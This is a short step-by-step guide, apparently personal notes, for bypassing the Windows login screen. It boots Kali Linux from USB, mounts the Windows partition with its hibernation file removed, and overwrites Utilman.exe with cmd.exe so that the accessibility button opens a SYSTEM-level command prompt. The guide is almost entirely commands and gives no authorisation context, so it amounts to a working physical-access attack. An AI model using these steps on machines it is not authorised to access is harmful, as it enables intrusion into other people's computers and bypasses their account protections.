### Boot kali from usb stick and create directory
```
mkdir /mnt/windows
```

### Mount windows partition
```
mount /dev/<windowsPartition> /mnt/windows
```

### If error occurs while mounting (Windows is hibernated, refuse to mount)
```
umount /dev/<windowsPartition>
mount -t ntfs-3g -o remove_hiberfile /dev/<windowsPartition> /mnt/windows
cd /mnt/windows/Windows/System32
```

### Create backup
```
cp Utilman.exe backup.exe
```

### Replace utilman with cmd
```
cp cmd.exe Utilman.exe
```

### Umount
```
umount -R /mnt
```

### Shut down kali and boot windows system ->  click "Utilman"

